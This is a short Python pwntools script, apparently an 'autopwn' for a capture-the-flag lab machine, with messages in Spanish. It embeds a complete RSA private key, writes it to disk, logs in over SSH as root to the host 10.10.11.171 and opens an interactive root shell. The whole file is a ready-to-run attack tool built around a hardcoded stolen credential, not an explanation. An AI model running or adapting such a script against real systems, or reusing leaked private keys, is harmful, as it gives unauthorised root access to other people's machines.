try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Extension ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

rsa = b"-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAxhCO2ZdFzdJj6zdL/L38ZGE7OzyRCnJ4qZJyz50X7Ux9JHWT\n7kZWP3uElhlwF2WbqsPoS/iUtAjV9keflS/38zfZEp1n/o7g+q8Fw+oxF0s/6fud\nhA4KieW/bKnG+aeaC/lBgx5L5EGqsw+RKeBqFmCVi8ySy1SEH4vy7mZzWO4w6Egy\nywWyk1gxGBEUuq1xVT0Wvagw+AQtkTJ9jo7wEGA1kAsY0G02hbwelLSPppTx72Ei\nPyr2hb9m5pwK6ywz38+4h4dPkyijcbaR0LNNKzDaeBGD78RxbnszHUTXKO/EsQYD\nqEYqbFkSMgoMylW8wbxtS1I7T+TW4+tvQzgw9QIDAQABAoIBAQCH384PqX4Cj6Vq\nNHoVfcQKnMVEgu1BTHxIYCYRFUTXztQ+0cZU/L2oOTUgv3ytIFBlGpZen75rr3AQ\nztvEPa8MlDB/W6p+8EeY0b7TwvJAd6f1/V32vKcwKINkqSfOFtNQCYOOzpbjlMTk\np/Y+0ywUA9gzmnjNskIdXiWetHvG8hNBArCU2h9CdlAr2thi3j1j3DR7VBUvuwtw\n6ny1422XL8xyIMg1qjLh9kFy6Ndif+GmnzuoQW4a18lDflIZQC+03MPRaZUuUbVE\npTIDztWjs1+YeVoGPq4nzy+1RsyrxCdA+0+0j6ZK6/++vJPsm+V1/xaModV+XRyg\nTjsQ0MJBAoGBAOnZ7qtDS/3qSXV6e+kzYcJUTF1d18gXaKfrEm3y09eKJ9mnApTf\nfW99PlP+wK+eLUbsdxz9xiBxGGuxB+XYclDLIkoIn2308ruBptYMz7LYkcaypsCB\nXEdi5bY8PlkXICXVhLaFNACydFf0Ve8cj4XG2t1WcBhKbVgCvIKbrzhxAoGBANjS\n7TmGIIdZarvx4icPboemviW6wbXYY79jGFA+zvQ6DFt3cNoLYKpFfzZoaOXrJyix\nocFijM0Jc+BX0c13bhCgnjxnZ2/IV3ggeEjKVeuV5wx1+TzdjpR0EAbvWUjd2Q41\nxSL6kSRI+Po/6Tn9GuzWidMrygWMNT1JhEVVbuLFAoGALDI1+0QyvoBi9cL6XC6L\n0VBhRlwQBg72hpXU29bC1r+TnH0F7eD3MfT3rKQ/AnHgmMDkGiSUJ1l4hhHlLjlk\nEYTyrA9JIlzi6zEruNSfBGwN0QG+pi9Mo2k7hN+J4QiP2NaryFsQYvlXJ7BT9Wbu\ncRgOETre4JhgZfvOaNjHmuECgYBnW70cA9Uz0CsyJq8g4ZlV7uWLxMgcsGd0T3/C\nmP48rANCAuD4AB53bKOkwwbmOz+yhWLPdfQatZvYYOSxZnJAWOC1eLF1NvKDYC8W\nu+VTZWT7qq1CF3elSuJs++H6+05CGN29u+Y+fs65NIgwTXhtWCPhV2l5VYn3ijkU\neBJg5QKBgQChntZ26dV5zBuH+sUBFDD38ATjMKWwKBy4EhogrPP1WPODi7MfPlSW\n9Pp/C6+rAd91VPcGo6TJD15CDhzTfzffHnjZJ0Nb6HDRL7mw6oimwVTLJttUk8GV\nQGGCfL85CcYSjPpqQp8ZOml4k/SaSzDUhb06PCuFi+i4afyuQyHAzw==\n-----END RSA PRIVATE KEY-----"

with open('key', 'wb') as f:
    f.write(rsa)

request = ssh(host='10.10.11.171', user='root', keyfile='key')
shell = request.process("/bin/sh")
shell.sendline(b"export HOME=/; bash")
shell.sendline(b"export HOME=/root; cd; echo")
shell.interactive()
